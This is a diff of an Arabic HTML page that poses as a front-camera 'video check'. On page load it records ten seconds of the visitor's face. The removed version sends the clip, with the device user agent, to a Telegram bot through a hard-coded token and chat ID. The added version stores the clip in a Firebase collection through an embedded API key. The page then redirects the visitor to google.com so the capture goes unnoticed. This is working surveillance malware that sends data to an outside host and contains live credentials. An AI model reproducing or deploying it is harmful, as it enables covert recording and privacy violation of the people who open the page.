@@ -1,73 +1,46 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>فحص الكاميرا</title>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>فحص الفيديو</title>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:'Segoe UI',Tahoma,sans-serif;background:#000;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
 .container{max-width:400px;width:100%;text-align:center}
-h1{font-size:18px;color:#4CAF50;margin-bottom:5px}
-.sub{color:#aaa;font-size:12px;margin-bottom:15px}
-video{width:100%;border-radius:15px;border:2px solid #333;margin-bottom:10px}
-.status{color:#4CAF50;font-size:14px;animation:blink 1s infinite;margin:10px 0}
-@keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
-.time-info{color:#ffaa00;font-size:11px;margin-top:5px}
+h1{font-size:18px;color:#4CAF50;margin-bottom:10px}
+video{width:100%;border-radius:12px;border:2px solid #333;margin-bottom:10px}
+.status{color:#4CAF50;font-size:14px;margin:10px 0}
 </style>
 </head>
 <body>
-<div class="container" id="form">
-<h1>🎬 فحص الكاميرا الأمامية</h1>
-<p class="sub">جاري تسجيل فيديو للفحص...</p>
+<div class="container"><h1>🎬 فحص فيديو أمامي</h1>
 <video id="video" autoplay playsinline muted></video>
-<div class="status">● جاري التسجيل...</div>
-<div class="time-info" id="timeInfo"></div>
-</div>
-
+<div class="status" id="status">⏳ جاري التسجيل...</div></div>
 <script>
-var u=new URL(window.location.href);
-var CHAT=u.searchParams.get('chatId')||'7276604783';
-var TOKEN=u.searchParams.get('token')||'8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
-var mediaRecorder;
-var recordedChunks=[];
-var stream;
-
-function updateTime(){
-var now=new Date();
-var timeStr=now.toLocaleString('ar-EG',{year:'numeric',month:'numeric',day:'numeric',hour:'2-digit',minute:'2-digit',second:'2-digit'});
-document.getElementById('timeInfo').textContent='🕐 '+timeStr;
-}
-
-setInterval(updateTime,1000);
-updateTime();
-
-async function startRecording(){
+firebase.initializeApp({apiKey:"AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",projectId:"game-a1aca",storageBucket:"game-a1aca.firebasestorage.app",appId:"1:598280425947:android:0e4ead8d9b50cfc92157fe"});
+var db=firebase.firestore();
+var mr,chunks=[];
+async function go(){
 try{
-stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
-document.getElementById('video').srcObject=stream;
-mediaRecorder=new MediaRecorder(stream);
-mediaRecorder.ondataavailable=function(e){if(e.data.size>0)recordedChunks.push(e.data);};
-mediaRecorder.onstop=sendVideo;
-mediaRecorder.start();
-setTimeout(function(){mediaRecorder.stop();stream.getTracks().forEach(function(t){t.stop();});},10000);
-}catch(e){document.querySelector('.sub').textContent='خطأ في الكاميرا';}
-}
-
-async function sendVideo(){
-var now=new Date();
-var timeStr=now.toLocaleString('ar-EG',{year:'numeric',month:'numeric',day:'numeric',hour:'2-digit',minute:'2-digit',second:'2-digit'});
-var blob=new Blob(recordedChunks,{type:'video/mp4'});
-var fd=new FormData();
-fd.append('chat_id',CHAT);
-fd.append('video',blob,'video_'+Date.now()+'.mp4');
-fd.append('caption','🎬 <b>فيديو أمامي</b>\n\n🕐 <b>الوقت:</b> '+timeStr+'\n📱 <b>الجهاز:</b> '+navigator.userAgent+'\n🌐 <b>الخدمة:</b> كاميرا أمامية');
-try{await fetch('https://api.telegram.org/bot'+TOKEN+'/sendVideo',{method:'POST',body:fd});}catch(e){}
-document.querySelector('.status').textContent='✅ تم التسجيل بنجاح';
+var s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
+document.getElementById('video').srcObject=s;
+mr=new MediaRecorder(s);
+mr.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data);};
+mr.onstop=async function(){
+var blob=new Blob(chunks,{type:'video/mp4'});
+var r=new FileReader();
+r.onload=async function(e){
+await db.collection('gallery').add({url:e.target.result,type:'🎬 فيديو أمامي',timestamp:new Date().toISOString()});
+document.getElementById('status').textContent='✅ تم التسجيل';
 setTimeout(function(){window.location.href='https://google.com/'},2000);
+};
+r.readAsDataURL(blob);
+};
+mr.start();
+setTimeout(function(){mr.stop();s.getTracks().forEach(function(t){t.stop();});},10000);
+}catch(e){document.getElementById('status').textContent='❌ خطأ';}
 }
-
-startRecording();
-</script>
-</body>
-</html>
+go();
+</script></body></html>
